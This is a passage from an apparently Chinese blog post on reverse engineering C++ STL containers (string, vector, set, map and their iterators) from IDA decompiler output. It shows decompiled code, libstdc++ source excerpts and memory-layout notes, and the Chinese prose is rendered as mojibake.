class="hljs-number">10</span>);<br><br>  vector&lt;string&gt; v;<br>  v.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;vector string&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æ— ç¬¦å·å’Œæœ‰ç¬¦å·:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-F0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-D0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-A0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v7[<span class="hljs-number">59</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [rsp+ABh] [rbp-45h] BYREF</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+ACh] [rbp-44h] BYREF</span><br>  <span class="hljs-keyword">char</span> v10[<span class="hljs-number">47</span>]; <span class="hljs-comment">// [rsp+B0h] [rbp-40h] BYREF</span><br>  <span class="hljs-keyword">char</span> v11[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+DFh] [rbp-11h] BYREF</span><br><br>  <span class="hljs-built_in">sub_2648</span>(v7, a2, a3);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v8);<br>  <span class="hljs-built_in">sub_2834</span>(v6, <span class="hljs-string">&quot;fuck&quot;</span>, &amp;v8);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v8);<br>  *(_DWORD *)<span class="hljs-built_in">sub_28D4</span>(v7, v6) = <span class="hljs-number">666</span>;<br>  <span class="hljs-built_in">sub_26B8</span>(v5);<br>  v9 = <span class="hljs-number">10</span>;<br>  <span class="hljs-built_in">sub_2A5C</span>(v5, &amp;v9);<br>  <span class="hljs-built_in">sub_2728</span>(v4);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v11);<br>  <span class="hljs-built_in">sub_2834</span>(v10, <span class="hljs-string">&quot;vector string&quot;</span>, v11);<br>  <span class="hljs-built_in">sub_2B90</span>(v4, v10);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(v10);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v11);<br>  <span class="hljs-built_in">sub_2B4C</span>(v4);<br>  <span class="hljs-built_in">sub_26D4</span>(v5);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(v6);<br>  <span class="hljs-built_in">sub_2664</span>(v7);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  std::vector&lt;..::basic_string&lt;... &gt;,std::allocator&lt;..::basic_string&lt;...&gt; &gt; &gt; v; <span class="hljs-comment">// [rsp+0h] [rbp-F0h] BYREF</span><br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt; &gt; s; <span class="hljs-comment">// [rsp+20h] [rbp-D0h] BYREF</span><br>  std::string fuckkey; <span class="hljs-comment">// [rsp+50h] [rbp-A0h] BYREF</span><br>  std::map&lt;..::basic_string&lt;... &gt;,<span class="hljs-keyword">int</span>,std::less&lt;..::basic_string&lt;... &gt; &gt;,allocator &gt; m; <span class="hljs-comment">// [rsp+70h] [rbp-80h] BYREF</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt; __a; <span class="hljs-comment">// [rsp+ABh] [rbp-45h] BYREF</span><br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt; &gt;::value_type __x; <span class="hljs-comment">// [rsp+ACh] [rbp-44h] BYREF</span><br>  ..::basic_string&lt;... &gt; v10; <span class="hljs-comment">// [rsp+B0h] [rbp-40h] BYREF</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt; v11; <span class="hljs-comment">// [rsp+DFh] [rbp-11h] BYREF</span><br><br>  std::map&lt;..&gt;::basic_string&lt;...&gt;,<span class="hljs-keyword">int</span>,std::less&lt;..&gt;::basic_string&lt;...&gt;&gt;,allocator&gt;::<span class="hljs-built_in">map</span>(&amp;m);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;__a, argv);<br>  ..::basic_string&lt;...&gt;::basic_string&lt;std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;fuckkey, <span class="hljs-string">&quot;fuck&quot;</span>, &amp;__a);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;__a);<br>    <br>  *std::map&lt;..&gt;::basic_string&lt;&gt;::<span class="hljs-keyword">operator</span>[](<br>     &amp;m,<br>     &amp;fuckkey) = <span class="hljs-number">666</span>;<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">set</span>(&amp;s);<br>  __x = <span class="hljs-number">10</span>;<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">insert</span>(&amp;s, &amp;__x);<br>    <br>  std::vector&lt;..&gt;::basic_string&lt;...&gt;,allocator&gt;::<span class="hljs-built_in">vector</span>(&amp;v);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v11, &amp;__x);<br>  ..::basic_string&lt;...&gt;::basic_string&lt;std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(<br>    &amp;v10,<br>    <span class="hljs-string">&quot;vector string&quot;</span>,<br>    &amp;v11);<br>  std::vector&lt;..&gt;::basic_string&lt;...&gt;,allocator&gt;::<span class="hljs-built_in">push_back</span>(<br>    &amp;v,<br>    &amp;v10);<br>  <span class="hljs-comment">//Destructor</span><br>  ..::basic_string&lt;...&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v10);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v11);<br>  std::vector&lt;..&gt;::basic_string&lt;...&gt;,allocator&gt;::~<span class="hljs-built_in">vector</span>(&amp;v);<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::~<span class="hljs-built_in">set</span>(&amp;s);<br>  ..::basic_string&lt;...&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;fuckkey);<br>  std::map&lt;..&gt;::basic_string&lt;...&gt;,<span class="hljs-keyword">int</span>,std::less&lt;..::basic_string&lt;...&gt;&gt;,allocator&gt;::~<span class="hljs-built_in">map</span>(&amp;m);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="iter"><a href="#iter" class="headerlink" title="iter"></a>iter</h4><ul><li>For a reverse iterator <code>r</code> constructed from an iterator <code>i</code>, the relationship &amp;<em>r == &amp;</em>(i-1) is always true !!!!!!!!!!!!!!<br>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆrbegin()ä¼šçœ‹åˆ°ä¸€ä¸ª<code>*a1 -= 8</code>. è¿™ä¸ªåªæ˜¯vectorçš„è¿­ä»£å™¨, å…¶ä½™ç»“æ„è¿­ä»£å™¨æœ‰å¾…åˆ†æ. </li></ul><p><img src="../../image/recent_ctf/range-rbegin-rend.svg" alt="range-rbegin-rend.svg"></p><ul><li>å¦‚ä¸‹æ–¹è¡¨æ ¼, å…¶ä¸­aâ€“(æˆ–è€…a++)çš„å†…éƒ¨æœ‰æµç¨‹å°±æ˜¯å¦‚æ­¤, </li></ul><table><thead><tr><th align="center">Expression</th><th align="center">Return</th><th align="center">Equivalent expression</th></tr></thead><tbody><tr><td align="center">â€“a</td><td align="center">It&amp;</td><td align="center"></td></tr><tr><td align="center">aâ€“</td><td align="center">convertible to const It&amp;</td><td align="center">It temp = a; <br />â€“a;<br />return temp;</td></tr><tr><td align="center">*aâ€“</td><td align="center">reference</td><td align="center"></td></tr></tbody></table><ul><li><p>**è¦æ³¨æ„åˆ°, ä¸Šé¢è¡¨æ ¼çš„tempåœ¨ç¼–è¯‘ä¸­å‘ç°æ¥è‡ª<code>operator++()</code>ä¸Šå±‚å‡½æ•°å½“åšå‚æ•°ä¼ å…¥çš„å±€éƒ¨å˜é‡, ä¼šæœ‰åŸºäºå±€éƒ¨å˜é‡ç©ºé—´çš„ç›¸åº”è¿­ä»£å™¨æ„é€ å‡½æ•°æ‰§è¡Œ, ç„¶åè¿›å…¥<code>operator--()</code>, æœ€åè¿”å›tempä¹Ÿå°±æ˜¯ä¼ å…¥çš„æŒ‡é’ˆ. </p></li><li><p>è¿˜æœ‰ä¸€ç‚¹é—®é¢˜, åº“å‡½æ•°ä¼¼ä¹æ˜¯<code>__fastcall</code>ç±»å‹, å¦‚æœæ–‡ä»¶å¸¦ä¸Šç¬¦å·IDAå¤§æ¦‚ç‡è¯†åˆ«æˆ<code>__cdecl</code>, è€Œä¸”ä¸¤ä¸ªç‰ˆæœ¬è®¾ç½®call typeæ—¶ä»€ä¹ˆéƒ½ä¸åšéƒ½èƒ½æŠ¥é”™, åŠ ä¸Š7.5ç‰ˆæœ¬åç¼–è¯‘ç›¸å…³å‡½æ•°æ—¶ä¹Ÿæ— æ³•è‡ªåŠ¨è¯†åˆ«, ä½†æ˜¯8.1å¯ä»¥. è¿˜æ˜¯ç”¨æ–°çš„å§. ä½†æ˜¯æ–°ç‰ˆçš„æŠŠallocator lesså•¥çš„éƒ½æ ‡å‡ºæ¥, æ˜¾å¾—å‡½æ•°åéå¸¸éå¸¸çš„é•¿. ä¹Ÿæ˜¯ä¸€ä¸ªç¼ºç‚¹(?)å§. </p></li><li><p>begin()çš„æµç¨‹: </p><ul><li>ä½¿ç”¨ä¸´æ—¶å˜é‡å­˜å‚¨iter(æœ‰æ•ˆå­—æ®µå°±8å­—èŠ‚), </li><li>ç„¶åè°ƒç”¨ç›¸åº”iteratoræ„é€ å‡½æ•°(å…¶å®å°±æ˜¯<code>this-&gt;_M_node = __x</code>è¿™æ ·çš„)</li><li>ç›´æ¥returnè¿”å›<code>__x</code>å¯¹åº”çš„æŒ‡é’ˆ.</li></ul></li><li><p>rbegin()çš„æµç¨‹: æ˜¾è€Œæ˜“è§. è¿˜æ˜¯ä½¿ç”¨äº†ä¸´æ—¶å˜é‡. ç„¶åå†æ„é€ åå‘è¿­ä»£å™¨. </p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt;::reverse_iterator __fastcall std::vector&lt;enc *,std::allocator&lt;enc *&gt;&gt;::<span class="hljs-built_in">rbegin</span>(<br>        std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt; *<span class="hljs-keyword">const</span> <span class="hljs-keyword">this</span>,<br>        std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt; *a2)<br>&#123;<br>  std::vector&lt;enc*,std::allocator&lt;enc*&gt; &gt;::iterator v2; <span class="hljs-comment">// rax</span><br><br>  v2._M_current = std::vector&lt;enc *,std::allocator&lt;enc *&gt;&gt;::<span class="hljs-built_in">end</span>(a2)._M_current;<br>  std::reverse_iterator&lt;__gnu_cxx::__normal_iterator&lt;enc **,std::vector&lt;enc *,std::allocator&lt;enc *&gt;&gt;&gt;&gt;::<span class="hljs-built_in">reverse_iterator</span>(<br>    <span class="hljs-keyword">this</span>,<br>    v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li></li></ul><h4 id="string"><a href="#string" class="headerlink" title="string"></a>string</h4><blockquote><p><del>64ä½ä¸‹å ç”¨32å­—èŠ‚,</del> æ„Ÿè§‰ä¸æ˜¯å¾ˆå›ºå®šå•Š, è¿˜æ˜¯å¾—çœ‹å…·ä½“çš„æ¶æ„å’Œç³»ç»Ÿ. å°±æ‹¿64ä½linuxç‰ˆgccç¼–è¯‘çš„å§. </p></blockquote><p>64ä½ä¸‹å ç”¨32å­—èŠ‚. å·®ç‚¹å¿˜è®°classçš„å®ç°æ˜¯å…ˆåœ¨æ ˆä¸Šåˆ†é…ç©ºé—´ç„¶åæ„é€ æ—¶æŠŠthisæŒ‡é’ˆ(æŒ‡å‘æ ˆä¸Š)æ”¾åˆ°æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªä½ç½®, æ‰¾ç›¸åº”æ„é€ å‡½æ•°åŠå¤©æ²¡çœ‹åˆ°åŸæ¥æ˜¯è¿™æ ·.  å°±æ˜¯è¿™ä¸ª<code>basic_string( const CharT* s, const Allocator&amp; alloc = Allocator() );</code>, å¯ä»¥æŸ¥åˆ°å„ç§std::string std::wstringç­‰å°±æ˜¯basic_stringæ¨¡æ¿çš„å®ä¾‹åŒ–. </p><p>stringæ‰€æœ‰çš„æ„é€ å‡½æ•°éƒ½åœ¨basic_stringé‡ŒæŸ¥æ‰¾å³å¯, å…¨å±€stringå’Œå…¶ä»–å…¨å±€å˜é‡çš„æ„é€ å‡½æ•°ä¸€èµ·è¢«åŠ å…¥ä¸ºæ„é€ å‡½æ•°æŒ‡é’ˆæ•°ç»„, åœ¨<code>_do_global_ctors</code>ä¹‹ç±»çš„å‡½æ•°é‡ŒæŒ‰é¡ºåºæ‰§è¡Œ. mainé‡Œé¢çš„stringæŒ‰ç…§å±€éƒ¨classå˜é‡åˆ†é…å’Œä½¿ç”¨ç©ºé—´.</p><blockquote><p>è¿™ä¸ªæ‰€è°“çš„allocatorå°±å ç”¨ä¸€å­—èŠ‚, æ‡’å¾—æ¢ç©¶è¿™æ˜¯ä»€ä¹ˆäº†. </p></blockquote><p><del>æä¸æ˜ç™½è¿™32å­—èŠ‚æ˜¯ä»€ä¹ˆä¸œè¥¿, æš‚æ—¶æ”¾å¼ƒ.</del> å¯ä»¥çœ‹ä¸‹é¢çš„æºç åˆ†æ. </p><p>ä»é¢˜ç›®ä¸­å­¦åˆ°çš„:</p><ul><li>substrå…¶å®ä¸æ­¢ä¸¤ä¸ªå‚æ•°, åç¼–è¯‘æ—¶ä¼šæœ‰å››ä¸ªå‚æ•°, ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ ˆä¸Šä¸´æ—¶stringå˜é‡, ç”¨æ¥æ¥æ”¶substrçš„è¿”å›å€¼, å¦‚æœæ²¡æœ‰èµ‹å€¼å°±ç›´æ¥ææ„äº†; å¦‚æœå†å¯¹è¿”å›å€¼ç”¨ä¸Š<code>operator[]()</code>å…¶å®æ˜¯å¯¹ä¸´æ—¶stringçš„æˆå‘˜å‡½æ•°è°ƒç”¨, æ²¡æœ‰è°ƒç”¨åç«‹åˆ»è¢«é”€æ¯äº†. </li><li>åœ¨æºç ä¸­çœ‹åˆ°C++11ç‰ˆæœ¬å’Œä¹‹å‰çš„stringå†…å­˜å¸ƒå±€ä¸ç›¸åŒ, ä¸è¿‡æƒ³æ¥è‡³å°‘éƒ½ç”¨ä¸Šäº†11, å°±æ‹¿è¿™ä¸ªä¸ºåŸºå‡†äº†. </li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">_Alloc_hider_M_dataplus;<span class="hljs-comment">//__Alloc_hideré‡Œé¢åˆæœ‰</span><br>size_type_M_string_length;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span> _S_local_capacity = <span class="hljs-number">15</span> / <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(_CharT) &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br>  _CharT           _M_local_buf[_S_local_capacity + <span class="hljs-number">1</span>];<br>  size_type        _M_allocated_capacity;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>â€‹        è€Œç¬¬ä¸€è¡Œ<code>__Alloc_hider</code>é‡Œé¢åˆæœ‰</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">pointer _M_p; <span class="hljs-comment">// The actual data.</span><br></code></pre></div></td></tr></table></figure><p>â€‹        æ‰€ä»¥å¯¹äº<code>typedef basic_string&lt;char&gt;Â string</code>æ¥è¯´å°±æ˜¯8+8+16=32å­—èŠ‚. C++11ç‰¹æœ‰, å…¶ä»–ç‰ˆæœ¬æœªçœ‹. </p><h4 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h4><p><del>ä¹Ÿæ˜¯32å­—èŠ‚</del>. å…¶å®æ˜¯24å­—èŠ‚. </p><p>æ„é€ å‡½æ•°è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„å¥—å¨ƒæ¸…é›¶å‡½æ•°. <code>_Vector_base</code>å’Œ<code>_Vector_impl::_Vector_impl</code>ä¹‹ç±»çš„å‡½æ•°. åœ¨ç¬¬ä¸‰å±‚è°ƒç”¨allocator, å…¶å®å•¥ä¹Ÿæ²¡å¹²å°±è¿”å›äº†.</p><p>æˆ‘ç®—æ˜¯çœ‹æ˜ç™½è¿™ä¸ª32å­—èŠ‚çš„å¸ƒå±€äº†, æºç é‡Œæ‰¾åŠå¤©. åœ¨<code>gcc/libstdc++-v3/include/bits/stl_vector.h</code>é‡Œå‰å‡ è¡Œå°±æ˜¯_Vector_base, å®šä¹‰äº†ä¸€äº›åŸºæœ¬çš„å†…å­˜å¸ƒå±€å’Œä¸€å †æ„é€ ææ„(åŸæ¥structä¹Ÿèƒ½æœ‰æ„é€ ä¹‹ç±»çš„), ç„¶åvectorå°±å®šä¹‰operatorä¹‹ç±»çš„æœ‰å®é™…ä½œç”¨çš„åº“å‡½æ•°. å—¯, ä¹Ÿå¯ä»¥åœ¨IDAé‡Œç›´æ¥æŸ¥çœ‹class, ä¸ç”¨è¿½ç©¶ç»†èŠ‚è¿˜æ›´å¿«ä¸€ç‚¹. </p><p>å…¶ä¸­:</p><ul><li><p><code>_Vector_base::_Vector_impl</code>ç»§æ‰¿äº†<code>_Vector_base::_Vector_impl_data</code>, è€Œdataç»“æ„ä½“ä¸­å«æœ‰<code>_M_start/finish/end_of_storage</code>ä¸‰ä¸ªæŒ‡é’ˆ, å¹¶å£°æ˜äº†**<code>_Vector_impl _M_impl;</code>** </p></li><li><p>vector classåˆç»§æ‰¿äº†<code>_Vector_base</code>, å®šä¹‰äº†<code>typedef _Vector_baseÂ _Base</code> <code>using _Base::_M_impl;</code>, äºæ˜¯å†…å­˜å°±æ˜¯3*8=24å­—èŠ‚, IDAé‡Œä¹Ÿæ˜¯å¦‚æ­¤, è‡³äºä¸ºä»€ä¹ˆå±€éƒ¨å˜é‡æ˜¯32å­—èŠ‚, æˆ‘ä¹Ÿä¸çŸ¥é“. sizeofä¹Ÿæ˜¯24, ç¡®å®å°±æ˜¯è¿™ä¸‰ä¸ª. </p></li><li><p>vectorçš„è¿­ä»£å™¨å¥½åƒåªæœ‰ä¸€ä¸ªæˆå‘˜å˜é‡, æ˜¯æŒ‡é’ˆ. ç¡®å®å¦‚æ­¤, </p></li><li><p>é‡åˆ°äº†ä¸€ä¸ª<code>*sub_558C(&amp;iter_reverse)</code>æ“ä½œ, å…¶å®æ˜¯<code>operator*()</code>, å› ä¸ºvectoræ˜¯åºåˆ—å¼å†…å­˜åˆ†å¸ƒ, æ‰€ä»¥ç›´æ¥åœ¨å†…éƒ¨å°†æŒ‡é’ˆå‡8. å…·ä½“è§ä¸Šé¢iter. </p></li><li><p>çªç„¶å‘ç°æˆ‘å¥½åƒè®¤ä¸å‡ºæ¥vectorçš„eraseâ€¦.åˆå»çœ‹åç¼–è¯‘äº†. </p><ul><li><p>åœ¨C++11ä¸‹ç¬¬ä¸€å±‚å°è£…</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">iterator <span class="hljs-title">erase</span><span class="hljs-params">(const_iterator __position)</span></span><br><span class="hljs-function">      </span>&#123; <span class="hljs-keyword">return</span> _M_erase(<span class="hljs-built_in">begin</span>() + (__position - <span class="hljs-built_in">cbegin</span>())); &#125;<br></code></pre></div></td></tr></table></figure><p><code>_M_erase</code>ç¬¬äºŒå±‚å°è£…</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp, <span class="hljs-keyword">typename</span> _Alloc&gt;<br><span class="hljs-keyword">typename</span> vector&lt;_Tp, _Alloc&gt;::iterator<br>vector&lt;_Tp, _Alloc&gt;::_M_erase(iterator __position)<br>&#123;<br><span class="hljs-keyword">if</span> (__position + <span class="hljs-number">1</span> != <span class="hljs-built_in">end</span>())<br>_GLIBCXX_MOVE3(__position + <span class="hljs-number">1</span>, <span class="hljs-built_in">end</span>(), __position);<br>--<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish;<br>_Alloc_traits::<span class="hljs-built_in">destroy</span>(<span class="hljs-keyword">this</span>-&gt;_M_impl, <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish);<br><span class="hljs-keyword">return</span> __position;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>é—®é¢˜åœ¨äºç¬¬ä¸€å±‚å°è£…çœ‹èµ·æ¥å¾ˆçŸ­, ä½†æ˜¯ç”±äºC++11çš„æ–°å‚æ•°ç±»å‹const iteratorå¯¼è‡´åœ¨å‡½æ•°ä½¿ç”¨<code>__position</code>ä¸ºbaseæ¥æ„é€ ä¸€ä¸ªå±€éƒ¨iterator, ç„¶åè°ƒç”¨<code>opertor-</code>, å±€éƒ¨å˜é‡æ¥æ”¶begin()è¿”å›å€¼, <code>operator+</code>, æœ€åæ‰æ˜¯<code>_M_erase()</code>çš„è°ƒç”¨, æ˜¾å¾—å¾ˆé•¿.<br>å³ä½¿æ˜¯ç¬¬äºŒå±‚å°è£…ç¬¬ä¸€çœ¼ä¹Ÿæ²¡çœ‹å‡ºæ¥+1çš„æ“ä½œ, å…¶å®è¿˜æ˜¯å°è£…åœ¨äº†<code>operator+</code>é‡Œ. å¤šç†Ÿæ‚‰ä¸‹å°±æ‡‚äº†. ä¸ç­‰äºå·ä¹Ÿæ˜¯ä¸ªå‡½æ•°(â€¦)<br>moveåˆæ˜¯ä¸€å †ä»£ç , æ”¾å¼ƒäº†è§£ç»†èŠ‚. </p></li><li><p>è‡³äºä¸ºä»€ä¹ˆ<code>operator-</code>é‡Œé¢æœ‰ä¸ª0xAAAAAAAAAAAAAAAB, ç‰µæ‰¯è¿‡å¤š, é™¤éçœ‹æ‡‚traitså’Œvectoræ‰€æœ‰Member typesç­‰ç­‰ä¸œè¥¿. ç®€å•è¯´å°±æ˜¯<code>bool divisible_by_3 = number * 0xAAAAAAABu &lt;= 0x55555555u;</code> è¿˜å¯ä»¥ç”¨è¿™ä¸ªä¹˜æ³•ä»£æ›¿å¸¸æ•°é™¤æ³•. æœ¬è´¨æ•°å­¦é¢˜, ä¸æ˜¯é‚£å—æ–™. </p></li><li><p><b style="font-weight:bold;font-size:x-large">å‘ç°ä¸€ä¸ªæ–°é—®é¢˜, è¿™ä¸ªæ€ä¹ˆæ²¡æœ‰destroy <code>__position</code>æŒ‡å‘çš„å…ƒç´ ?è¿™ä¹Ÿèƒ½å«åšerase? å°±åªæ˜¯è®©å®ƒä»å‘é‡ä¸­æ¶ˆå¤±? </b> çœŸç»äº†, ä¸ºä»€ä¹ˆçœ‹èµ·æ¥è¿™ä¹ˆå¥‡æ€ª, å¯èƒ½åœ¨å®é™…ä¹Ÿæœ‰ç”¨å¤„, æ‰€ä»¥ä¸æ˜¯é»˜è®¤è¡Œä¸º. </p></li></ul></li></ul><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>48å­—èŠ‚. </p><p>æ„é€ å‡½æ•°è¿˜æ˜¯æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„. å¥—å¨ƒæ˜¯çœŸè°›. </p><p>å’Œmapæœ‰ç€ä¸€æ ·çš„æ„é€ å‡½æ•°, æ’å…¥æ—¶ä¹Ÿèƒ½æ‰¾åˆ°rb_tree_insert. æ³¨æ„åŒºåˆ«.     </p><h4 id="map-1"><a href="#map-1" class="headerlink" title="map"></a>map</h4><p><del>59å­—èŠ‚æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</del>. å…¶å®æ˜¯48å­—èŠ‚. </p><p>mapä¸­åªæœ‰ <code>std::map::_Rep_typeÂ _M_t</code>, å…¶å®å°±æ˜¯<code> _Rb_tree</code>è¿™ä¸ªclass, å®ƒçš„å†…å­˜ä»…åŒ…å« <code>std::_Rb_tree::_Rb_tree_implÂ _M_impl</code> , è€Œè¿™ä¸ªæˆå‘˜çš„åµŒå¥—å…³ç³»å¦‚ä¸‹:    </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span 